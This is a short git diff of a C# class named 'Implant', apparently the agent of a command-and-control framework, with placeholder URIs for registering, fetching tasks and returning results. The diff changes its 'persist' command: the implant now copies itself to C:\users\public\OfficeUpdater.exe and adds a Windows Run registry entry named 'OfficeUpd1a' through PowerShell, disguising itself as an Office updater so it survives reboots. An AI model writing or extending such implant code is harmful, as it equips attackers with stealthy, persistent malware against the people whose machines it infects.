@@ -13,7 +13,7 @@ public class Implant
     private static string uriReg = "§URIG§";
     private static string uriRes = "§URIS§";
     private static string uriTas = "§URIT§";
-
+    
 
     private static int n = 3;
     private static string name = "";
@@ -119,9 +119,14 @@ public class Implant
                     }
                     else if (command == "persist")
                     {
-                        string persistK = "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"FazilImpl\" -Value \"" 
-                            + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"";
-                        string res = Shell("powershell", persistK); // Esegue il comando e ottiene l'output
+                        string fOri = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                        string fDest = @"C:\users\public\OfficeUpdater.exe";
+                        string rKey = @"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
+
+                        string payload = "Copy-Item -Path \"" + fOri + "\" -Destination \"" + fDest + "\"; Set-ItemProperty -Path \"" + rKey + "\" -Name OfficeUpd1a -Value \"" + fDest + "\"";   
+    
+
+                        string res = Shell("powershell", payload); // Esegue il comando e ottiene l'output
                         //Ok, no errors
                         if (res.Length == 8) res += "Persistence has been created";
 
